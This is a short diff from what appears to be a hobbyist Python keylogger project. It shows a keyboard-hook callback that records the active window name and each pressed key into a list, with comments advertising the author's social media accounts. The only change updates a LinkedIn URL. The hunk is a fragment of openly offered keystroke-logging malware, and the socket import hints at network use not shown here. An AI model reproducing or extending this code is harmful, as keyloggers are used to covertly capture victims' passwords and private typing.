@@ -16,7 +16,7 @@ import socket
 # -------- KeyLogger -------- #
 
 def KeyBoard(event):
-    list.append(event.WindowName)                               # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
+    list.append(event.WindowName)                               # My Linkedin Account ==> "https://www.linkedin.com/in/eredotpkfr/"
     list.append("     0=={:::::::::::::::>     ")               # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
     list.append(event.Key)                                      # My GitHub Account ==> "https://github.com/eredotpkfr"
     list.append("\n")                                           # My İnstagram Account ==> "https://www.instagram.com/eredot_pk.fr/?hl=tr"
